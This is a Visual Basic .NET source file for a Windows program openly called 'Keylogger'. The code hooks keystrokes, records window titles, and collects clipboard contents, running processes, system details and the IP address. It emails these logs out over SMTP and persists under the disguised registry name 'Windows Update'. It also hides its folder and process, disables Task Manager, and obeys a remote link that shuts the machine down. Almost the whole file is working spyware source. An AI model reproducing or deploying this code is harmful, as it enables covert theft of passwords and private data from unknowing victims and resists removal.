Imports System.IO
Imports Microsoft.Win32
Imports System.Web
Imports System.Net.Mail
Imports System.Threading
Imports System.Net
Imports System.Management
Imports System.Environment
Imports System.Globalization
Imports System.ComponentModel





Public Class Form1
    Dim procNames As String = String.Empty
    Dim ipaddress As String
    Dim clipboardtxt As String
    Dim dll As ClassLibrary1.EncryptDecrypt
    Dim WithEvents K As New Keyboard
    Private Declare Function GetForegroundWindow Lib "user32.dll" () As Int32
    Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32
    Dim strin As String = Nothing
    Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Int32) As Int16
    Public Const MOD_ALT As Integer = &H1 'Alt key

    Public Const VK_NUMPAD1 As Integer = &H61 'NumPad 1 key
    Public Declare Function RegisterHotKey Lib "user32" (ByVal hwnd As IntPtr, ByVal id As Integer, ByVal fsModifiers As Integer, ByVal vk As Integer) As Integer

    Public Declare Function UnregisterHotKey Lib "user32" (ByVal hwnd As IntPtr, ByVal id As Integer) As Integer

    Public Const WM_HOTKEY As Integer = &H312

    Protected Overrides Sub WndProc(ByRef m As System.Windows.Forms.Message)
        Try
            If m.Msg = WM_HOTKEY Then



            End If

            MyBase.WndProc(m) 'Never Forget This
        Catch ex As Exception
            If My.Computer.FileSystem.FileExists(Application.StartupPath + "\Encrypt Decrypt dll.dll") = False Then

                CheckBox8.Enabled = False

            End If
        End Try
    End Sub


    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs)
        K.DiposeHook()
        If My.Settings.directory = Nothing Then

            MsgBox("Your settings will not be saved")

        Else
            Try
                My.Settings.Save()
            Catch ex As Exception
                MsgBox("I'm sorry, but an error has occured while I tried to save your settings.", MsgBoxStyle.Critical)
            End Try
        End If

    End Sub

    Private Sub K_Down(ByVal Key As String) Handles K.Down
        RichTextBox1.Text &= Key
        IO.File.AppendAllText(My.Settings.directory & "\log.txt", Key)

    End Sub
    Private Function GetActiveWindowTitle() As String
        Dim MyStr As String
        MyStr = New String(Chr(0), 100)
        GetWindowText(GetForegroundWindow, MyStr, 100)
        MyStr = MyStr.Substring(0, InStr(MyStr, Chr(0)) - 1)
        Return MyStr
    End Function

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick


        Try
            If strin <> GetActiveWindowTitle() Then
                RichTextBox1.Text = RichTextBox1.Text + vbNewLine + "[" + GetActiveWindowTitle() + "]" + vbNewLine
                IO.File.AppendAllText(My.Settings.directory & "\log.txt", vbNewLine + "[" + GetActiveWindowTitle() + "]" + vbNewLine)
                strin = GetActiveWindowTitle()

            End If


        Catch ex As Exception
            My.Computer.FileSystem.CreateDirectory(My.Settings.directory)
        End Try

    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        If My.Settings.hide = True Then
            CheckBox3.Checked = True
            Me.WindowState = FormWindowState.Minimized
        Else
            CheckBox3.Checked = False
            Me.WindowState = FormWindowState.Normal
        End If

        If My.Settings.hide = True Then
            HideKey()

        Else
        End If
        Start()
        Button1.Enabled = False
        Button2.Enabled = True
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click

   

        K.DiposeHook()
        Timer1.Stop()
        Button1.Enabled = True
        Button2.Enabled = False

    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        sendlog()
    End Sub

    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
       
        NotifyIcon1.Visible = False
        My.Settings.sstimertinterval = screenshotsettings.NumericUpDown1.Value
        My.Settings.timerinterval = NumericUpDown1.Value
        My.Settings.Save()

        End
    End Sub

    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        HideKey()
    End Sub
    Private Sub HideKey()
        Me.Hide()
        If My.Settings.showiconintray = True Then
            NotifyIcon1.Visible = True
        Else
            NotifyIcon1.Visible = False
        End If
    End Sub

    Private Sub ToolStripMenuItem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem2.Click
        If My.Settings.password = Nothing Then
            NotifyIcon1.Visible = False
            My.Settings.sstimertinterval = screenshotsettings.NumericUpDown1.Value
            My.Settings.timerinterval = NumericUpDown1.Value
            My.Settings.Save()
            If CheckBox8.Checked = True Then

                RichTextBox1.Text = dll.Encrypt(RichTextBox1.Text)

                My.Computer.FileSystem.WriteAllText(My.Settings.directory + "\log.txt", RichTextBox1.Text, False)
            End If
            End
        Else
            exitkey.Show()

        End If
    End Sub

    Private Sub ToolStripMenuItem3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem3.Click
        If My.Settings.password = Nothing Then
            Me.Show()
        Else

            showkey.Show()
         
        End If
    End Sub

    Private Sub RichTextBox1_TextChanged(ByVal sender As Object, ByVal e As System.EventArgs) Handles RichTextBox1.TextChanged

    End Sub

    Private Sub Button10_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        MsgBox(My.Settings.directory)
    End Sub



    Public Sub Start()
        K.CreateHook()
        Timer1.Start()
    End Sub

    Private Sub Form1_FormClosed(sender As Object, e As System.Windows.Forms.FormClosedEventArgs) Handles Me.FormClosed
     
    End Sub

    Private Sub Form1_FormClosing1(sender As Object, e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing

    End Sub

    Private Sub Form1_Shown(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Shown
        If My.Settings.hide = True And My.Settings.startlog = True Then
            HideKey()
        Else

        End If
    End Sub

    Private Sub Button10_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs)
        password.Show()
    End Sub
    Private Sub sendlog()
        If My.Settings.email = Nothing Then
            MsgBox("The log could not be sent because no email has been set in the email settings.", MsgBoxStyle.Critical)
        Else
            Try
                Cursor.Current = Cursors.WaitCursor
                Dim mail As New MailMessage()
                Dim SmtpServer As New SmtpClient
                SmtpServer.Credentials = New Net.NetworkCredential(My.Settings.gmusername, My.Settings.gmpassword)
                SmtpServer.Port = My.Settings.smtpport
                SmtpServer.Host = My.Settings.smtpserver
                SmtpServer.EnableSsl = My.Settings.enablessl

                mail.To.Add(My.Settings.email)
                mail.From = New MailAddress("keyloggertest@keylogger.com")
                mail.Subject = "Logs"
                mail.Body = RichTextBox1.Text
                SmtpServer.Send(mail)
                Cursor.Current = Cursors.Default
                MsgBox("Successful!", MsgBoxStyle.Information)
            Catch se As SmtpException
                Cursor.Current = Cursors.Default
                MsgBox("Could not send email. Check your internet connection and make sure that your email settings are correct.", MsgBoxStyle.Critical)
            Catch ex As Exception
                Cursor.Current = Cursors.Default
                MsgBox(ex.Message, MsgBoxStyle.Critical)
            End Try

        End If

    End Sub

    Private Sub ToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem1.Click
        sendlog()

    End Sub

    Private Sub CheckBox1_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked Then
            AddCurrentKey("Windows Update", System.Reflection.Assembly.GetEntryAssembly.Location)
            My.Settings.startup = True
            My.Settings.Save()
        Else
            RemoveCurrentKey("Windows Update")
            My.Settings.startup = False
            My.Settings.Save()
        End If
    End Sub
    Private Sub AddCurrentKey(ByVal name As String, ByVal path As String)
        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        key.SetValue("Windows Update", path)
    End Sub
    Private Sub RemoveCurrentKey(ByVal name As String)
        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        key.DeleteValue("Windows Update", False)

    End Sub

    Private Sub Timer2_Tick(sender As System.Object, e As System.EventArgs) Handles Timer2.Tick
        Try
            Dim mail As New MailMessage()
            Dim SmtpServer As New SmtpClient
            SmtpServer.Credentials = New Net.NetworkCredential(My.Settings.gmusername, My.Settings.gmpassword)
            SmtpServer.Port = My.Settings.smtpport
            SmtpServer.Host = My.Settings.smtpserver

            SmtpServer.EnableSsl = My.Settings.enablessl
            mail.To.Add(My.Settings.email)
            mail.From = New MailAddress("keyloggertest@keylogger.com")
            mail.Subject = "Logs"
            mail.Body = RichTextBox1.Text
            SmtpServer.Send(mail)

        Catch ex As Exception
          

        End Try

    End Sub

    Public Sub CheckForUpdates()
        Me.Cursor = Cursors.WaitCursor
        Dim request As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create("https://dl.dropboxusercontent.com/u/76348047/Keylogger/version.txt")

        Dim response As System.Net.HttpWebResponse = request.GetResponse()
        Dim sr As System.IO.StreamReader = New System.IO.StreamReader(response.GetResponseStream())
        Dim newestversion As String = sr.ReadToEnd()
        Dim currentversion As String = Application.ProductVersion
        If newestversion.Contains(currentversion) Then
            MsgBox(" You have the latest version :D ", MsgBoxStyle.Information)
        Else
            updateavaible.Show()
        End If
        Me.Cursor = Cursors.Default


    End Sub




    Private Sub Timer3_Tick(sender As System.Object, e As System.EventArgs) Handles Timer3.Tick
        If My.Computer.Keyboard.CtrlKeyDown And My.Computer.Keyboard.AltKeyDown And GetAsyncKeyState(Keys.Z) Then
            If My.Settings.password = Nothing Then
                Me.Show()
            Else
                Timer3.Stop()
                showkey.Show()
                showkey.Focus()
                showkey.Select()
                showkey.TextBox1.Focus()
                showkey.TextBox1.Select()
                Timer3.Start()
            End If
        End If
    End Sub


    Private Sub OpenFileDialog1_FileOk(sender As System.Object, e As System.ComponentModel.CancelEventArgs) Handles OpenFileDialog1.FileOk
        Try
            RichTextBox1.Text = Nothing
            Dim reader As New IO.StreamReader(OpenFileDialog1.FileName)


            RichTextBox1.Text = dll.Decrypt(RichTextBox1.Text)
            RichTextBox1.Text = reader.ReadToEnd
            reader.Close()
            TabControl1.SelectedTab = TabPage1
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Dim sysinfo As String
    Public Function ScreenResolution() As String
        Dim intX As Integer = Screen.PrimaryScreen.Bounds.Width
        Dim intY As Integer = Screen.PrimaryScreen.Bounds.Height
        Return intX & " × " & intY
    End Function
    Private Function getDefaultBrowser() As String
        Dim retVal As String = String.Empty
        Using baseKey As Microsoft.Win32.RegistryKey = My.Computer.Registry.CurrentUser.OpenSubKey("Software\Clients\StartmenuInternet")
            Dim baseName As String = baseKey.GetValue("").ToString
            Dim subKey As String = "SOFTWARE\" & IIf(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE") = "AMD64", "Wow6432Node\", "") & "Clients\StartMenuInternet\" & baseName
            Using browserKey As Microsoft.Win32.RegistryKey = My.Computer.Registry.LocalMachine.OpenSubKey(subKey)
                retVal = browserKey.GetValue("").ToString
            End Using
        End Using
        Return retVal
    End Function
    Private Sub Button16_Click_2(sender As System.Object, e As System.EventArgs) Handles Button16.Click
        Try
            Dim path = System.IO.Path.Combine(Application.StartupPath, "Keylogger help.chm")
            Help.ShowHelp(ParentForm, path, HelpNavigator.TableOfContents)
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub
    Private Function GetGraphicsCardName() As String
        Dim GraphicsCardName = String.Empty
        Try
            Dim WmiSelect As New ManagementObjectSearcher _
            ("root\CIMV2", "SELECT * FROM Win32_VideoController")

            For Each WmiResults As ManagementObject In WmiSelect.Get()

                GraphicsCardName = WmiResults.GetPropertyValue("Name").ToString

                If (Not String.IsNullOrEmpty(GraphicsCardName)) Then

                    Exit For

                End If

            Next

        Catch err As ManagementException


            MessageBox.Show(err.Message)

        End Try

        Return GraphicsCardName

    End Function

    Private Sub Form1_Load_1(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Thread.CurrentThread.CurrentUICulture = New CultureInfo("fr-FR")
        Thread.CurrentThread.CurrentCulture = New CultureInfo("fr-FR")
        Try
            If My.Computer.FileSystem.DirectoryExists(My.Settings.directory) = True Then

            Else
                My.Computer.FileSystem.CreateDirectory(My.Settings.directory)
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
        Dim checkFile As System.IO.DirectoryInfo
        checkFile = My.Computer.FileSystem.GetDirectoryInfo(My.Settings.directory)
        Dim attributeReader As System.IO.FileAttributes
        attributeReader = checkFile.Attributes
        If My.Settings.sendemailatlaunch = True Then
            CheckBox12.Checked = True
            Try

                My.Settings.gmusername = My.Settings.gmusername
                My.Settings.gmpassword = My.Settings.gmpassword
                Dim mail As New MailMessage()
                Dim SmtpServer As New SmtpClient
                SmtpServer.Credentials = New Net.NetworkCredential(My.Settings.gmusername, My.Settings.gmpassword)
                SmtpServer.Port = My.Settings.smtpport
                SmtpServer.Host = My.Settings.smtpserver

                SmtpServer.EnableSsl = My.Settings.enablessl
                mail.To.Add(My.Settings.email)
                mail.From = New MailAddress("keyloggertest@keylogger.com")
                mail.Subject = "Keylogger Started"
                mail.Body = ("On " + Now + " the Keylogger program has started on the computer: " + My.Computer.Name)
                SmtpServer.Send(mail)


            Catch ex As Exception

            End Try
        Else
            CheckBox12.Checked = False
        End If
        If (attributeReader And System.IO.FileAttributes.Hidden) > 0 Then
            CheckBox4.Checked = True
        Else
            CheckBox4.Checked = False
        End If
        Try
            If My.Settings.hideprogramfolder = True Then
                CheckBox15.Checked = True
                File.SetAttributes(IO.Path.GetDirectoryName(Application.StartupPath), FileAttributes.Hidden)

            Else
                CheckBox15.Checked = False
                File.SetAttributes(IO.Path.GetDirectoryName(Application.StartupPath), FileAttributes.Normal)

            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try


        If My.Settings.getclipboard = True Then
            Try
                CheckBox14.Checked = True

                clipboardtxt = vbNewLine + "----Clipboard----" + vbNewLine + Clipboard.GetText + vbNewLine + "----------------------"
            Catch ex As Exception
                clipboardtxt = "Error retrieving clipboard"
            End Try
        Else

            clipboardtxt = Nothing
            CheckBox14.Checked = False

        End If


        If My.Settings.getipaddress = True Then
            CheckBox18.Checked = True
            Try
                Dim req As HttpWebRequest = WebRequest.Create("http://www.prodigyproductionsllc.com/yourip.php")
                Dim res As HttpWebResponse = req.GetResponse()
                Dim Stream As Stream = res.GetResponseStream()
                Dim sr As StreamReader = New StreamReader(Stream)
                ipaddress = vbNewLine + "IP Address: " + sr.ReadToEnd
            Catch ex As Exception
                ipaddress = vbNewLine + "IP Address: " + "Error finding IP"
            End Try
        Else
            ipaddress = Nothing
            CheckBox18.Checked = False
        End If
        If My.Settings.includesysinfo = True Then
            CheckBox10.Checked = True
        Else
            CheckBox10.Checked = False
        End If
        screenshotsettings.NumericUpDown1.Value = My.Settings.sstimertinterval
        If My.Settings.emailphotos = True Then
            screenshotsettings.CheckBox6.Checked = True
        Else
            screenshotsettings.CheckBox6.Checked = False
        End If
        TextBox2.Text = My.Settings.shutdownlink
        TextBox3.Text = My.Settings.selfdestructlink
        If My.Settings.disableregedit = True Then

            CheckBox19.Checked = True

        Else

            CheckBox19.Checked = False

        End If
        If My.Settings.alwaysontop = True Then
            CheckBox16.Checked = True
            Me.TopMost = True
        Else
            CheckBox16.Checked = False
            Me.TopMost = False
        End If
        If My.Settings.disabletaskmanager = True Then
            CheckBox17.Checked = True

            Dim regkey As Microsoft.Win32.RegistryKey
            Dim keyValueInt As String = "1"
            Dim subKey As String = "Software\Microsoft\Windows\CurrentVersion\Policies\System"
            regkey = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(subkey:=subKey)
            regkey.SetValue("DisableTaskMgr", keyValueInt)
            regkey.Close()
        Else
            Try

                CheckBox17.Checked = False

                Dim rkey As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System\", True)

                rkey.DeleteValue("DisableTaskMgr", True)

                rkey.Close()


                Dim rkey2 As RegistryKey = Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System", True)

                rkey.DeleteValue("DisableTaskMgr", True)

                rkey2.Close()
            Catch ex As Exception

                My.Settings.disabletaskmanager = False
                CheckBox17.Checked = False
            End Try
        End If
        If My.Settings.enableshutdown = True Then
            CheckBox11.Checked = True
            TextBox2.Enabled = True
            shutdown.Start()
        Else
            CheckBox11.Checked = False
            TextBox2.Enabled = False
            shutdown.Stop()
        End If
        If My.Settings.enableselfdestruct = True Then
            CheckBox21.Checked = True
            TextBox3.Enabled = True
            selfdestruct.Start()
        Else
            CheckBox21.Checked = False
            TextBox3.Enabled = False
            selfdestruct.Stop()
        End If

        If My.Settings.takescreenshot = True Then
            screenshotsettings.CheckBox5.Checked = True
            screenshotsettings.picturetimer.Start()
            screenshotsettings.NumericUpDown1.Enabled = True
            screenshotsettings.ComboBox1.Enabled = True
            screenshotsettings.CheckBox6.Enabled = True
        Else
            screenshotsettings.CheckBox5.Checked = False
            screenshotsettings.picturetimer.Stop()
            screenshotsettings.NumericUpDown1.Enabled = False
            screenshotsettings.ComboBox1.Enabled = False
            screenshotsettings.CheckBox6.Enabled = False
        End If

        If My.Settings.sstimeramount = "seconds" Then
            screenshotsettings.picturetimer.Interval = NumericUpDown1.Value * "1000"
            screenshotsettings.ComboBox1.SelectedItem = "seconds"
        End If
        If My.Settings.sstimeramount = "minutes" Then
            screenshotsettings.picturetimer.Interval = NumericUpDown1.Value * "60000"
            screenshotsettings.ComboBox1.SelectedItem = "minutes"

        End If

        If My.Settings.sstimeramount = "hours" Then
            screenshotsettings.picturetimer.Interval = NumericUpDown1.Value * "3600000"
            screenshotsettings.ComboBox1.SelectedItem = "hours"

        End If

        Dim localAll As Process() = Process.GetProcesses()
        Try
            If My.Settings.getrunningprocesses = True Then
                CheckBox13.Checked = True


                procNames += vbNewLine + "------RUNNING PROCESSES------" + vbNewLine
                For Each p In localAll
                    procNames &= p.ProcessName & Environment.NewLine
                Next
                procNames += "--------END PROCESSES--------"
            Else
                CheckBox13.Checked = False
                procNames = Nothing
            End If

        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
        End Try





        If My.Settings.autocheck = True Then
            CheckBox5.Checked = True
            Try
                Dim request As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create("https://dl.dropboxusercontent.com/u/76348047/Keylogger/version.txt")

                Dim response As System.Net.HttpWebResponse = request.GetResponse()
                Dim sr As System.IO.StreamReader = New System.IO.StreamReader(response.GetResponseStream())
                Dim newestversion As String = sr.ReadToEnd()
                Dim currentversion As String = Application.ProductVersion
                If newestversion.Contains(currentversion) Then

                Else
                    updateavaible.Show()
                End If
            Catch ex As Exception
            End Try
        Else
            CheckBox5.Checked = False
        End If
        If My.Settings.emailupdate = True Then
            If My.Settings.email = Nothing Then
            Else
            End If
        End If

        If My.Computer.FileSystem.FileExists(Application.StartupPath + "\Encrypt Decrypt dll.dll") = False Then

            CheckBox8.Enabled = False
        End If
        If My.Settings.emailupdate = True Then
            CheckBox26.Checked = True
            Try
                Dim request As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create("https://dl.dropboxusercontent.com/u/76348047/Keylogger/version.txt")

                Dim response As System.Net.HttpWebResponse = request.GetResponse()
                Dim sr As System.IO.StreamReader = New System.IO.StreamReader(response.GetResponseStream())
                Dim newestversion As String = sr.ReadToEnd()
                Dim currentversion As String = Application.ProductVersion
                If newestversion.Contains(currentversion) Then
                Else
                    Dim mail As New MailMessage()
                    Dim SmtpServer As New SmtpClient
                    SmtpServer.Credentials = New Net.NetworkCredential(My.Settings.gmusername, My.Settings.gmpassword)
                    SmtpServer.Port = My.Settings.smtpport
                    SmtpServer.Host = My.Settings.smtpserver
                    SmtpServer.EnableSsl = My.Settings.enablessl

                    mail.To.Add(My.Settings.email)
                    mail.From = New MailAddress("keyloggertest@keylogger.com")
                    mail.Subject = "New Update Available!"
                    mail.Body = "Hello," + vbNewLine + vbNewLine + "There is a new update available for Keylogger on the computer: " + My.Computer.Name + ". Please go on that computer to download the update manually. This email is being sent to you at your request for security purposes." + vbNewLine + vbNewLine + "Thank you for using Keylogger. :)"
                    SmtpServer.Send(mail)
                End If
            Catch ex As Exception
            End Try
        Else
            CheckBox26.Checked = False
        End If


        If My.Settings.hideprocess = True Then
            CheckBox9.Checked = True

            TMListViewDelete.Running = True
        Else
            CheckBox9.Checked = False

            TMListViewDelete.Running = False
        End If


        If My.Settings.showiconintray = True Then
            CheckBox7.Checked = True
        Else
            CheckBox7.Checked = False
        End If


        If Timer1.Enabled = False Then
            Button1.Enabled = True
            Button2.Enabled = False
        Else
            Button1.Enabled = False
            Button2.Enabled = True
        End If


        Dim CpuName As String
        CpuName = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", Nothing)

        Try
            If My.Settings.includesysinfo = True Then

                sysinfo = vbNewLine + "Current user: " + My.User.Name + vbNewLine + "OS Name: " + My.Computer.Info.OSFullName + vbNewLine + "OS Version: " + My.Computer.Info.OSVersion + vbNewLine + "Computer Name: " + My.Computer.Name + vbNewLine + "CPU: " + CpuName + vbNewLine + "RAM: " + (My.Computer.Info.TotalPhysicalMemory / 1024 / 1024 / 1024).ToString("n2") + "GB" + vbNewLine + "Screen Resolution: " + ScreenResolution() + vbNewLine + "Default Browser: " + getDefaultBrowser() + vbNewLine + "Video Card: " + GetGraphicsCardName() + vbNewLine + "Scroll Wheel: " + My.Computer.Mouse.WheelExists.ToString



            Else
                sysinfo = Nothing
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try

        Try

            IO.Directory.CreateDirectory(My.Settings.directory)
            IO.File.AppendAllText(My.Settings.directory & "\log.txt", "-------------------------------" + vbNewLine + "Keylogged Strokes " + Now() + sysinfo + procNames + clipboardtxt + ipaddress + vbNewLine + "----------------------------" + vbNewLine + vbNewLine)



        Catch ex As UnauthorizedAccessException
            MsgBox(ex.Message, MsgBoxStyle.Critical, "Windows")
        End Try

        TextBox1.Text = My.Settings.directory

        If My.Settings.startup = True Then
            CheckBox1.Checked = True
        Else
            CheckBox1.Checked = False
        End If
        If My.Settings.autoemail = True Then
            CheckBox6.Checked = True
            NumericUpDown1.Enabled = True
            Timer2.Start()
            Timer2.Interval = NumericUpDown1.Value * "60000"
            NumericUpDown1.Value = My.Settings.timerinterval

        Else
            Timer2.Stop()
            CheckBox6.Checked = False
            NumericUpDown1.Enabled = False
        End If

        If My.Settings.hide = True Then
            CheckBox3.Checked = True

        Else
            CheckBox3.Checked = False

        End If
        If My.Settings.startlog = True Then
            CheckBox2.Checked = True
            If My.Settings.encrypt = True Then

            End If

        Else
            CheckBox2.Checked = False


        End If
        If My.Settings.disablefolderoptions = True Then
            CheckBox22.Checked = True
        Else
            CheckBox22.Checked = False
        End If
        If My.Settings.startlog = True Then
            Button1.PerformClick()
        Else
        End If

        If My.Settings.disablecmd = True Then
            CheckBox20.Checked = True
        Else
            CheckBox20.Checked = False
        End If
        If My.Settings.disablecontrolpanel = True Then
            CheckBox23.Checked = True
        Else
            CheckBox23.Checked = False
        End If
        If My.Settings.disablerightclick = True Then
            CheckBox25.Checked = True
        Else
            CheckBox25.Checked = False
        End If
        If My.Settings.disablefirewall = True Then
            CheckBox27.Checked = True
        Else
            CheckBox27.Checked = False
        End If
        If My.Settings.disablerun = True Then
            CheckBox24.Checked = True
        Else
            CheckBox24.Checked = False
        End If
        If My.Settings.password = Nothing Then
            Label6.Show()

        Else
            Label6.Hide()
        End If
        RichTextBox1.Text = Now() + sysinfo + procNames + clipboardtxt + ipaddress
        Try
            If My.Settings.encrypt = True Then
                CheckBox8.Checked = True
                RichTextBox1.Text = dll.Encrypt(RichTextBox1.Text)
            Else
                CheckBox8.Checked = False
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try

    End Sub

    Private Sub Button17_Click_2(sender As System.Object, e As System.EventArgs)

    End Sub


    Private Sub CheckBox11_CheckedChanged(sender As System.Object, e As System.EventArgs) Handles CheckBox11.CheckedChanged
        If CheckBox11.Checked = True Then
            My.Settings.enableshutdown = True
            shutdown.Start()
            My.Settings.shutdownlink = TextBox2.Text
            TextBox2.Enabled = True
        Else
            My.Settings.enableshutdown = False
            shutdown.Stop()
            My.Settings.shutdownlink = TextBox2.Text
            TextBox2.Enabled = False

        End If
        My.Settings.Save()
    End Sub

    Private Sub shutdown_Tick(sender As System.Object, e As System.EventArgs) Handles shutdown.Tick
        If My.Settings.shutdownlink = Nothing Then
            shutdown.Stop()
            MsgBox("There is no link entered", MsgBoxStyle.Critical)

            CheckBox11.Checked = False
        Else
            Try
                Dim request As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(My.Settings.shutdownlink)
                Dim response As System.Net.HttpWebResponse = request.GetResponse
                Dim reader As System.IO.StreamReader = New System.IO.StreamReader(response.GetResponseStream)

                Dim ExecuteShutdown As String = reader.ReadToEnd
                Label8.Hide()

                If ExecuteShutdown.Contains("true") Then
                    Shell("shutdown -s -t 0")

                ElseIf ExecuteShutdown.Contains("false") Then
                    Shell("shutdown -a")

                End If

            Catch we As WebException
                Label8.Show()
                Label8.Text = "Error: " + we.Message
            Catch ex As Exception
                shutdown.Stop()
                MsgBox(ex.Message, MsgBoxStyle.Critical)

                TextBox2.Text = Nothing
                CheckBox11.Checked = False
            End Try

        End If

    End Sub

    Private Sub TextBox2_TextChanged(sender As System.Object, e As System.EventArgs) Handles TextBox2.TextChanged
        My.Settings.shutdownlink = TextBox2.Text

        My.Settings.Save()

    End Sub

    Private Sub Button11_Click_1(sender As System.Object, e As System.EventArgs) Handles Button11.Click
        email.Show()
    End Sub

    Private Sub Button12_Click_2(sender As System.Object, e As System.EventArgs) Handles Button12.Click
        screenshotsettings.Show()
    End Sub

    Private Sub Button10_Click_2(sender As System.Object, e As System.EventArgs) Handles Button10.Click
        password.Show()
    End Sub

    Private Sub CheckBox8_CheckedChanged_1(sender As System.Object, e As System.EventArgs) Handles CheckBox8.CheckedChanged

        If CheckBox8.Checked = True Then
            My.Settings.encrypt = True
            My.Settings.Save()
            If Timer1.Enabled = False Then



                If RichTextBox1.Text = Nothing = True Then
                    MsgBox("Nothing has been logged", MsgBoxStyle.Critical, "Cannot encrypt")
                    CheckBox8.Checked = False
                    My.Settings.encrypt = False

                Else

                    RichTextBox1.Text = dll.Encrypt(RichTextBox1.Text)
                    My.Computer.FileSystem.WriteAllText(My.Settings.directory + "\log.txt", RichTextBox1.Text, False)

                End If

            End If




        Else
            If Timer1.Enabled = False Then


                RichTextBox1.Text = dll.Decrypt(RichTextBox1.Text)

            End If
            My.Settings.encrypt = False
            My.Settings.Save()

        End If
        My.Settings.Save()
    End Sub

    Private Sub CheckBox7_CheckedChanged_1(sender As System.Object, e As System.EventArgs) Handles CheckBox7.CheckedChanged
        If CheckBox7.Checked = True Then
            My.Settings.showiconintray = True
            My.Settings.Save()
            NotifyIcon1.Visible = True
        Else

            MsgBox("If you want to show the Keylogger program again later, press CTRL + ALT + Z ", MsgBoxStyle.Information)
            My.Settings.showiconintray = False
            My.Settings.Save()
            NotifyIcon1.Visible = False
        End If
    End Sub

    Private Sub CheckBox3_CheckedChanged_1(sender As System.Object, e As System.EventArgs) Handles CheckBox3.CheckedChanged
        If CheckBox3.Checked = True Then
            My.Settings.hide = True
        Else
            My.Settings.hide = False
        End If
        My.Settings.Save()
    End Sub

    Private Sub CheckBox2_CheckedChanged_1(sender As System.Object, e As System.EventArgs) Handles CheckBox2.CheckedChanged
        If CheckBox2.Checked = True Then
            My.Settings.startlog = True

        Else
            My.Settings.startlog = False
        End If
        My.Settings.Save()

    End Sub

    Private Sub CheckBox4_CheckedChanged_1(sender As System.Object, e As System.EventArgs) Handles CheckBox4.CheckedChanged
        Try
            If CheckBox4.Checked = True Then
                File.SetAttributes(My.Settings.directory, FileAttributes.Hidden)

            Else
                File.SetAttributes(My.Settings.directory, FileAttributes.Normal)

            End If
        Catch ex As Exception

            CheckBox4.Checked = False
            MsgBox(ex.Message, MsgBoxStyle.Critical)
        End Try

    End Sub

    Private Sub TextBox1_TextChanged_1(sender As System.Object, e As System.EventArgs) Handles TextBox1.TextChanged
        My.Settings.directory = TextBox1.Text
        My.Settings.Save()
        If My.Settings.directory = Nothing Then
            TextBox1.Text = "C:\Keylogger Log"
        End If
    End Sub

    Private Sub Button7_Click_1(sender As System.Object, e As System.EventArgs) Handles Button7.Click
        FolderBrowserDialog1.ShowDialog()
        TextBox1.Text = FolderBrowserDialog1.SelectedPath

    End Sub

    Private Sub Button13_Click_2(sender As System.Object, e As System.EventArgs) Handles Button13.Click
        Try
            Process.Start(My.Settings.directory)
        Catch ex As Exception
            MsgBox("Could not open. Check to make sure that the directory exists.", MsgBoxStyle.Critical)

        End Try
    End Sub

    Private Sub Button6_Click_1(sender As System.Object, e As System.EventArgs) Handles Button6.Click
        If My.Settings.password = Nothing Then
            If MsgBox("Are you sure you want to clear the log? This will also delete the log file stored on your computer.", MsgBoxStyle.YesNo) = Windows.Forms.DialogResult.Yes Then
                Try

                    If My.Computer.FileSystem.DirectoryExists(My.Settings.directory) = True Then

                        RichTextBox1.Text = Nothing
                        IO.File.Delete(My.Settings.directory & "\log.txt")
                        MsgBox("Done!", MsgBoxStyle.Information)
                    Else
                        MsgBox("Directory doesn't exist, directory will now be created", MsgBoxStyle.Critical)
                        RichTextBox1.Text = Nothing
                        My.Computer.FileSystem.CreateDirectory(My.Settings.directory)

                    End If
                Catch ex As Exception
                    MsgBox("Failed to clear the log :( ", MsgBoxStyle.Critical)
                End Try
            End If
        Else
            clearlog.Show()
        End If
    End Sub

